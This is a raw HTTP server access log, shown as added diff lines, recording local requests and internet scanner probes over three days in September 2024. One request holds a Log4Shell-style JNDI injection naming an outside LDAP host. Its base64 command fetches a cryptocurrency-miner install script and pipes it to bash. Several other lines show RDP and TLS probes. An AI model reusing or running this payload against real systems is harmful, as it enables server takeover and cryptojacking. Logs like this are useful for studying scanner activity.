+127.0.0.1 - - [13/Sep/2024 02:21:51] "GET /favicon.ico HTTP/1.1" 404 -
+198.235.24.206 - - [13/Sep/2024 02:22:16] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [13/Sep/2024 04:15:23] "GET / HTTP/1.1" 200 -
+20.225.3.88 - - [13/Sep/2024 04:35:12] "GET /v2/ HTTP/1.1" 404 -
+147.185.133.181 - - [13/Sep/2024 04:44:24] code 400, message Bad request version ('À\x13À')
+147.185.133.181 - - [13/Sep/2024 04:44:24] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03\x05ãùª~,Di±ô\x97×Ú\x94£`\x80\x0e¿ü§-\x08>\x9f20U?½\x1c] çw\x92M\x86ö\x00YÊ\x96Çz4yÇ%<¬ás\x16±vôâWÓ÷xPf®\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À" HTTPStatus.BAD_REQUEST -
+147.185.133.181 - - [13/Sep/2024 04:44:24] code 400, message Bad HTTP/0.9 request type ("\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03xrRq/%\x92!\x96<ü\x8a&?\x82¾I`õ4a\x8e¬R\x93µavìÔ\x03:\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À")
+147.185.133.181 - - [13/Sep/2024 04:44:24] "\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03xrRq/%\x92!\x96<ü\x8a&?\x82¾I`õ4a\x8e¬R\x93µavìÔ\x03:\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À\x09À(À$À\x14À" HTTPStatus.BAD_REQUEST -
+79.124.49.214 - - [13/Sep/2024 05:41:33] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+79.124.49.214 - - [13/Sep/2024 05:41:33] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+79.124.49.214 - - [13/Sep/2024 05:41:43] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+79.124.49.214 - - [13/Sep/2024 05:41:43] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [13/Sep/2024 07:37:33] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [13/Sep/2024 07:37:36] "GET /favicon.ico HTTP/1.1" 404 -
+198.235.24.22 - - [13/Sep/2024 07:46:30] "GET / HTTP/1.1" 200 -
+206.168.34.61 - - [13/Sep/2024 08:15:36] code 400, message Bad request version ('À\x14À')
+206.168.34.61 - - [13/Sep/2024 08:15:36] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03Xò´\x1b#a\x1f\x97\x95\x15çÐþ\x88\x09L\x05JÀ@\x80{|\x95&Êê\x05\x8a\x0fY© Ù§£\x9cÒÏ\x1f ¸^×>ã\x0bpÌP§\x15®\x0e\x1e\x0bâRðóé;\x9fú\x92\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+206.168.34.61 - - [13/Sep/2024 08:15:39] "GET / HTTP/1.1" 200 -
+206.168.34.61 - - [13/Sep/2024 08:15:44] "GET / HTTP/1.1" 200 -
+206.168.34.61 - - [13/Sep/2024 08:15:45] "GET /favicon.ico HTTP/1.1" 404 -
+206.168.34.61 - - [13/Sep/2024 08:15:45] code 505, message Invalid HTTP version (2.0)
+206.168.34.61 - - [13/Sep/2024 08:15:45] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+127.0.0.1 - - [13/Sep/2024 09:32:28] "GET /ui/favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [13/Sep/2024 09:40:15] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [13/Sep/2024 09:40:45] "GET / HTTP/1.1" 200 -
+185.234.216.112 - - [13/Sep/2024 10:17:05] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+185.234.216.112 - - [13/Sep/2024 10:17:05] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [13/Sep/2024 10:29:56] "GET /ui/favicon.ico HTTP/1.1" 404 -
+198.235.24.67 - - [13/Sep/2024 10:33:57] "GET / HTTP/1.1" 200 -
+83.222.190.78 - - [13/Sep/2024 10:54:46] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+83.222.190.78 - - [13/Sep/2024 10:54:46] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+178.159.37.98 - - [13/Sep/2024 11:00:20] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+178.159.37.98 - - [13/Sep/2024 11:00:20] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [13/Sep/2024 11:34:17] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [13/Sep/2024 13:03:07] "GET /ui/favicon.ico HTTP/1.1" 404 -
+185.234.216.112 - - [13/Sep/2024 13:05:27] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+185.234.216.112 - - [13/Sep/2024 13:05:27] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+46.101.85.130 - - [13/Sep/2024 14:53:08] code 400, message Bad request version ('¶\x14\x95-B#¸þ\x00\x01<Ì\x14Ì\x13Ì\x15À0À,À(À$À\x14À')
+46.101.85.130 - - [13/Sep/2024 14:53:08] "\x16\x03\x01\x01þ\x01\x00\x01ú\x03\x03L´\x8c\x9eî\x1eË~âÏÀõ\x03ã!\x94\x89}\x8fcù\x12R\x0d¶\x14\x95-B#¸þ\x00\x01<Ì\x14Ì\x13Ì\x15À0À,À(À$À\x14À" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [13/Sep/2024 15:38:42] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [13/Sep/2024 16:32:48] "GET /robots.txt HTTP/1.1" 404 -
+127.0.0.1 - - [13/Sep/2024 16:32:49] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [13/Sep/2024 16:33:11] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [13/Sep/2024 16:33:21] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [13/Sep/2024 17:12:20] "GET /ui/favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [13/Sep/2024 17:12:21] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [13/Sep/2024 17:12:22] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [13/Sep/2024 17:12:28] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [13/Sep/2024 17:12:28] "GET /security_check/123/123 HTTP/1.1" 200 -
+104.236.70.16 - - [13/Sep/2024 18:22:46] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03Ìäí9\x94ªBú\x19\x18Õ¬¶µ\x0eB*Hks\x9e\x94à#íÒÉQu\x01=¸\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+104.236.70.16 - - [13/Sep/2024 18:22:46] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03Ìäí9\x94ªBú\x19\x18Õ¬¶µ\x0eB*Hks\x9e\x94à#íÒÉQu\x01=¸\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+104.236.70.16 - - [13/Sep/2024 18:22:46] code 400, message Bad request version ('À\x14À')
+104.236.70.16 - - [13/Sep/2024 18:22:46] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03áø\x04\x15Éà\x97m´\x977Î:\x91HÎ\x18%>é2¤\x1d\x85Õ½êcvßUr\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+104.236.70.16 - - [13/Sep/2024 18:22:46] "GET / HTTP/1.1" 200 -
+185.91.127.9 - - [13/Sep/2024 18:28:36] "GET /t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//57.128.29.86:3306/TomcatBypass/Command/Base64/Y3VybCAtcyAtTCBodHRwczovL2Rvd25sb2FkLmMzcG9vbC5vcmcveG1yaWdfc2V0dXAvcmF3L21hc3Rlci9zZXR1cF9jM3Bvb2xfbWluZXIuc2ggfCBMQ19BTEw9ZW5fVVMuVVRGLTggYmFzaCAtcyA0OTlhNkxNdmFtV2N1cW5XN3dtTWg1aWZMMVZTejljM1lRcDJQY2JBREZQNGFyNmFkNWV2UFZSZXdCZkZxSEhQTlhXNG9yVmVBVTFyYVV6TWVWZkJRWjN0VHA4S1pMSg==}') HTTP/1.1" 404 -
+127.0.0.1 - - [13/Sep/2024 18:41:32] "GET / HTTP/1.1" 200 -
+185.234.216.112 - - [13/Sep/2024 19:27:56] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+185.234.216.112 - - [13/Sep/2024 19:27:56] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [13/Sep/2024 20:22:47] "GET /robots.txt HTTP/1.1" 404 -
+167.94.138.119 - - [13/Sep/2024 21:01:24] code 400, message Bad request syntax ('\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03Ð=\x9aîÍK\x9f\x18[;ìJè(\xad\x08\x98ë/Üßw[G')
+167.94.138.119 - - [13/Sep/2024 21:01:24] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03Ð=\x9aîÍK\x9f\x18[;ìJè(­\x08\x98ë/Üßw[G" HTTPStatus.BAD_REQUEST -
+167.94.138.119 - - [13/Sep/2024 21:01:28] "GET / HTTP/1.1" 200 -
+167.94.138.119 - - [13/Sep/2024 21:01:32] "GET / HTTP/1.1" 200 -
+167.94.138.119 - - [13/Sep/2024 21:01:32] "GET /favicon.ico HTTP/1.1" 404 -
+167.94.138.119 - - [13/Sep/2024 21:01:33] code 505, message Invalid HTTP version (2.0)
+167.94.138.119 - - [13/Sep/2024 21:01:33] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+167.94.138.120 - - [13/Sep/2024 21:27:36] code 400, message Bad request version ('À\x14À')
+167.94.138.120 - - [13/Sep/2024 21:27:36] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03°á+e§$­5\x19yV'G`ìGN\x1d\x10ö#\x00&õ\x97d\x0cN\x10KÙG ¬~é\x80¶\x13r$Ð\x050o\x14«.\x92g\x0f!\x0cé\x03¡±ï\x82Ç\x0eãz9º\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+167.94.138.120 - - [13/Sep/2024 21:27:40] "GET / HTTP/1.1" 200 -
+167.94.138.120 - - [13/Sep/2024 21:27:48] "GET / HTTP/1.1" 200 -
+167.94.138.120 - - [13/Sep/2024 21:27:49] "GET /favicon.ico HTTP/1.1" 404 -
+167.94.138.120 - - [13/Sep/2024 21:27:50] code 505, message Invalid HTTP version (2.0)
+167.94.138.120 - - [13/Sep/2024 21:27:50] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+127.0.0.1 - - [13/Sep/2024 23:39:48] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Sep/2024 00:54:20] "GET /register HTTP/1.1" 200 -
+127.0.0.1 - - [14/Sep/2024 01:21:28] "GET / HTTP/1.1" 200 -
+45.84.89.3 - - [14/Sep/2024 01:36:04] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+45.84.89.3 - - [14/Sep/2024 01:36:04] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU\x00\x00\x06À0\x00\x9c\x00\x9d\x01\x00\x00R\x00\x0b\x00\x04\x03\x00\x01\x02\x00" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [14/Sep/2024 02:05:14] "GET / HTTP/1.1" 200 -
+147.185.132.231 - - [14/Sep/2024 03:21:58] "GET / HTTP/1.0" 200 -
+205.210.31.185 - - [14/Sep/2024 03:41:22] "GET / HTTP/1.1" 200 -
+49.7.209.255 - - [14/Sep/2024 04:17:01] code 400, message Bad request version ('À\x14À')
+49.7.209.255 - - [14/Sep/2024 04:17:01] "\x16\x03\x01\x00²\x01\x00\x00®\x03\x03Æ\x9aäåy@·M\x02©¸}\x09\x0fT!\x13@ì\x81L>¼æðEI¤S¬­¡\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+49.7.209.255 - - [14/Sep/2024 04:17:13] "GET / HTTP/1.1" 200 -
+49.7.209.255 - - [14/Sep/2024 04:17:13] "GET /favicon.ico HTTP/1.1" 404 -
+49.7.209.255 - - [14/Sep/2024 04:17:14] "GET /robots.txt HTTP/1.1" 404 -
+49.7.209.255 - - [14/Sep/2024 04:17:14] "GET /sitemap.xml HTTP/1.1" 404 -
+127.0.0.1 - - [14/Sep/2024 04:20:12] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Sep/2024 04:24:14] "GET / HTTP/1.1" 200 -
+152.32.198.168 - - [14/Sep/2024 07:18:44] code 400, message Bad request version ('\x00\x9eÌ¨Ìª\x003\x00=\x00\x16À')
+152.32.198.168 - - [14/Sep/2024 07:18:44] "\x16\x03\x01\x01\x17\x01\x00\x01\x13\x03\x03U\x8dÅ¥¡ó¼\x80:GIêÜTùÍ,ç®Çè¼Ì4Û\x1aºÊÒhJ\x8c \x9fö\x8b+Ì3\x07µT|¶s"ËeD¨"\x9fQm\x9f\x86=\x84\x8c´¢å»\x7f¬\x004Ì¨Ì©À/À0À+À,À\x09\x00\x9eÌ¨Ìª\x003\x00=\x00\x16À" HTTPStatus.BAD_REQUEST -
+152.32.198.168 - - [14/Sep/2024 07:18:55] "GET / HTTP/1.1" 200 -
+152.32.198.168 - - [14/Sep/2024 07:18:56] "GET /favicon.ico HTTP/1.1" 404 -
+152.32.198.168 - - [14/Sep/2024 07:18:56] "GET /robots.txt HTTP/1.1" 404 -
+152.32.198.168 - - [14/Sep/2024 07:18:57] "GET /sitemap.xml HTTP/1.1" 404 -
+152.32.198.168 - - [14/Sep/2024 07:18:58] "GET /config.json HTTP/1.1" 404 -
+142.4.218.114 - - [14/Sep/2024 09:57:44] "GET / HTTP/1.1" 200 -
+206.81.30.220 - - [14/Sep/2024 09:58:59] "GET / HTTP/1.0" 200 -
+134.122.88.217 - - [14/Sep/2024 09:59:00] "GET /v2/_catalog HTTP/1.1" 404 -
+165.227.167.234 - - [14/Sep/2024 09:59:00] "GET /solr/admin/info/system HTTP/1.1" 404 -
+165.227.170.140 - - [14/Sep/2024 09:59:00] code 400, message Bad request version ("£n\x9b:#\x00>\x13\x02\x13\x03\x13\x01À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ")
+165.227.170.140 - - [14/Sep/2024 09:59:00] "\x16\x03\x01\x01$\x01\x00\x01 \x03\x03j\x1aà´þ\x0dúäv)ÍÐ¦\x0c\x93kï¦OÈ¸l^Ð=Ëø\x97\x14Þ¼> s<ÝYJ\x07t\x0b\x0e#÷\x85Ü5:«\x1fB°«wL\x9ad(t\x85£n\x9b:#\x00>\x13\x02\x13\x03\x13\x01À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ" HTTPStatus.BAD_REQUEST -
+165.227.167.234 - - [14/Sep/2024 09:59:00] "GET /cgi-bin/authLogin.cgi HTTP/1.1" 404 -
+207.154.209.152 - - [14/Sep/2024 09:59:00] "GET /query?q=SHOW+DIAGNOSTICS HTTP/1.1" 404 -
+165.227.171.205 - - [14/Sep/2024 09:59:00] code 400, message Bad request version ('À\x13À')
+165.227.171.205 - - [14/Sep/2024 09:59:00] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03Ý©H4UN\x8d#%Ö¾/\x12¥\x97¨ÍVp\x91¯Û8\x87âÁùÛî¡\x14Ã î\x1a>\x0b~\x8bÇ¯½A\x89\x1d£{¥\x97¨Æò¹®w\x95×äá{\x005\x9d\x12B\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À" HTTPStatus.BAD_REQUEST -
+165.227.167.234 - - [14/Sep/2024 09:59:00] "GET /solr/admin/cores?action=STATUS&wt=json HTTP/1.1" 404 -
+165.227.171.205 - - [14/Sep/2024 09:59:00] code 400, message Bad request version ('À\x13À')
+165.227.171.205 - - [14/Sep/2024 09:59:00] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03vO]\x9d:<²Þd\x93\x9f3.ÌCHåF\x95>bá+FË\x14Sý(ð¶Ø VÀF\x8c\x09P9¡O\x8cðGv\x99\x00:\x96+\x04È\x12q\x93ÊÔ\x872\x09\x9eq«\x13\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À" HTTPStatus.BAD_REQUEST -
+165.227.171.205 - - [14/Sep/2024 09:59:01] code 400, message Bad request version ('À\x13À')
+165.227.171.205 - - [14/Sep/2024 09:59:01] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03!\x1d¼|\x11v\x09Kó\x8d\x16ÈÎzñå\x09°ß·\x9aÄòÙÌáHîÊ\x83¶o `9¦\x19>åÊõ¢5þ\x88ÙBã\x09Ë\x83\x8aÙ\x81\x97­J¹¼Í­·Ñ>O\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À" HTTPStatus.BAD_REQUEST -
+120.0.52.187 - - [14/Sep/2024 10:00:00] code 400, message Bad request version ('.3=gÍ')
+120.0.52.187 - - [14/Sep/2024 10:00:00] "\x16\x03\x01\x01 \x01\x00\x01\x1c\x03\x03\x02Fê\x17O\x0fT\x98\x94 \x94ÞÊ\x03óðPyl\x83:<Æj"Fi×²òÍ¦ ¶= \x98Ü\x083\x15du}qöc\x89\x09.3=gÍ" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [14/Sep/2024 10:09:44] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Sep/2024 10:09:44] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Sep/2024 10:09:46] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [14/Sep/2024 10:09:49] "GET / HTTP/1.1" 200 -
+5.196.102.65 - - [14/Sep/2024 10:33:25] "GET /favicon.ico HTTP/1.1" 404 -
+178.159.37.98 - - [14/Sep/2024 10:44:52] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+178.159.37.98 - - [14/Sep/2024 10:44:52] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [14/Sep/2024 11:01:42] "GET /ui/favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [14/Sep/2024 11:01:44] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Sep/2024 11:01:44] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [14/Sep/2024 11:01:49] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [14/Sep/2024 11:01:49] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [14/Sep/2024 11:02:03] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Sep/2024 11:02:14] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [14/Sep/2024 11:14:35] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [14/Sep/2024 11:14:35] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [14/Sep/2024 11:18:55] "GET /security_check/test/218218 HTTP/1.1" 200 -
+127.0.0.1 - - [14/Sep/2024 11:18:55] "GET /idget/test HTTP/1.1" 200 -
+127.0.0.1 - - [14/Sep/2024 11:20:20] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Sep/2024 11:28:18] "GET /ui/favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [14/Sep/2024 11:28:19] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Sep/2024 11:28:19] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [14/Sep/2024 11:28:29] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [14/Sep/2024 11:28:29] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [14/Sep/2024 12:24:35] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [14/Sep/2024 12:24:35] "GET /security_check/123/123 HTTP/1.1" 200 -
+79.124.56.186 - - [14/Sep/2024 13:04:29] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+79.124.56.186 - - [14/Sep/2024 13:04:29] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+167.99.193.146 - - [14/Sep/2024 15:17:12] code 400, message Bad request syntax ('\x16\x03\x01\x01þ\x01\x00\x01ú\x03\x03')
+167.99.193.146 - - [14/Sep/2024 15:17:12] "\x16\x03\x01\x01þ\x01\x00\x01ú\x03\x03" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [14/Sep/2024 16:54:20] "GET /ui/favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [14/Sep/2024 16:54:21] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Sep/2024 16:54:21] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [14/Sep/2024 16:54:26] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [14/Sep/2024 16:54:26] "GET /security_check/123/123 HTTP/1.1" 200 -
+147.185.132.58 - - [14/Sep/2024 17:01:04] "GET / HTTP/1.1" 200 -
+8.210.104.185 - - [14/Sep/2024 17:07:30] code 400, message Bad request version ('À\x14À')
+8.210.104.185 - - [14/Sep/2024 17:07:30] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03¨çCä;D×a§¿Q¨\x7f"dNÿ~ü\x9fáB§¼\x1c®Õþ2t _ P^lÚ]~¯\x1f\x1b\x014\x1eµ%\x98ò·©ª\x98i6¡O~ØwÉÊq\x94÷\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+8.210.104.185 - - [14/Sep/2024 17:10:50] "GET / HTTP/1.1" 200 -
+8.210.104.185 - - [14/Sep/2024 17:11:10] "GET /favicon.ico HTTP/1.1" 404 -
+83.222.190.78 - - [14/Sep/2024 19:10:05] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+83.222.190.78 - - [14/Sep/2024 19:10:05] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [14/Sep/2024 20:35:24] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Sep/2024 23:34:55] "GET / HTTP/1.1" 200 -
+45.84.89.2 - - [15/Sep/2024 02:02:23] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+45.84.89.2 - - [15/Sep/2024 02:02:23] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU\x00\x00\x06À0\x00\x9c\x00\x9d\x01\x00\x00R\x00\x0b\x00\x04\x03\x00\x01\x02\x00" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [15/Sep/2024 02:17:54] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [15/Sep/2024 02:46:18] "GET / HTTP/1.1" 200 -
+79.124.56.186 - - [15/Sep/2024 03:28:25] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+79.124.56.186 - - [15/Sep/2024 03:28:25] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+83.222.190.78 - - [15/Sep/2024 06:12:01] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+83.222.190.78 - - [15/Sep/2024 06:12:01] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+202.43.6.7 - - [15/Sep/2024 06:20:41] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [15/Sep/2024 07:13:59] "GET / HTTP/1.1" 200 -
+162.142.125.200 - - [15/Sep/2024 07:22:10] code 400, message Bad request version ('À\x14À')
+162.142.125.200 - - [15/Sep/2024 07:22:10] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03ç»iHX;\x90þ\x84\x99áGoxê,4\x81¼\x94rrrëHåÚÇÁ\x0e\x1d7 x/Ö²Ág\x0b]°f)áø¶\x03G²[âh~Êÿw\x9a¨13\x16Í,³\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+162.142.125.200 - - [15/Sep/2024 07:22:14] "GET / HTTP/1.1" 200 -
+162.142.125.200 - - [15/Sep/2024 07:22:18] "GET / HTTP/1.1" 200 -
+162.142.125.200 - - [15/Sep/2024 07:22:19] "GET /favicon.ico HTTP/1.1" 404 -
+162.142.125.200 - - [15/Sep/2024 07:22:19] code 505, message Invalid HTTP version (2.0)
+162.142.125.200 - - [15/Sep/2024 07:22:19] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+167.94.138.48 - - [15/Sep/2024 08:47:28] code 400, message Bad request version ('À\x14À')
+167.94.138.48 - - [15/Sep/2024 08:47:28] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03}\x9eÜ \x9f\x07f\x80\x1f\x99\x94àÂ\x04\x9cåóÂ¥ÛO\x18§¼@dd0¨bÑÈ ¬ï\x11[\x7fò#\x93\x13\x92ÇY\x18`à\x0f¾û\x94\x9bBÑC§;A·V\x8d\x06`\x96\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+167.94.138.48 - - [15/Sep/2024 08:47:32] "GET / HTTP/1.1" 200 -
+167.94.138.48 - - [15/Sep/2024 08:47:39] "GET / HTTP/1.1" 200 -
+167.94.138.48 - - [15/Sep/2024 08:47:42] "GET /favicon.ico HTTP/1.1" 404 -
+167.94.138.48 - - [15/Sep/2024 08:47:44] code 505, message Invalid HTTP version (2.0)
+167.94.138.48 - - [15/Sep/2024 08:47:44] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+127.0.0.1 - - [15/Sep/2024 08:53:21] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [15/Sep/2024 08:53:21] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [15/Sep/2024 08:53:27] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [15/Sep/2024 08:53:27] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [15/Sep/2024 08:53:42] "GET /ui/favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [15/Sep/2024 08:53:42] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [15/Sep/2024 08:53:43] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [15/Sep/2024 08:53:48] "GET /idget/1 HTTP/1.1" 200 -
+127.0.0.1 - - [15/Sep/2024 08:53:48] "GET /security_check/1/1 HTTP/1.1" 200 -
+127.0.0.1 - - [15/Sep/2024 08:54:09] "GET /idget/2 HTTP/1.1" 200 -
+127.0.0.1 - - [15/Sep/2024 08:54:09] "GET /security_check/2/2 HTTP/1.1" 200 -
+127.0.0.1 - - [15/Sep/2024 08:54:18] "GET /idget/3 HTTP/1.1" 200 -
+127.0.0.1 - - [15/Sep/2024 08:54:18] "GET /security_check/3/3 HTTP/1.1" 200 -
+127.0.0.1 - - [15/Sep/2024 08:54:26] "GET /ui/favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [15/Sep/2024 08:54:27] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [15/Sep/2024 08:54:27] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [15/Sep/2024 08:54:36] "GET /idget/test HTTP/1.1" 200 -
+127.0.0.1 - - [15/Sep/2024 08:54:36] "GET /security_check/test/218218 HTTP/1.1" 200 -
+147.185.132.52 - - [15/Sep/2024 10:35:29] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/Sep/2024 11:29:32] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [15/Sep/2024 11:40:51] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [15/Sep/2024 11:40:51] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [15/Sep/2024 11:41:06] "GET / HTTP/1.1" 200 -
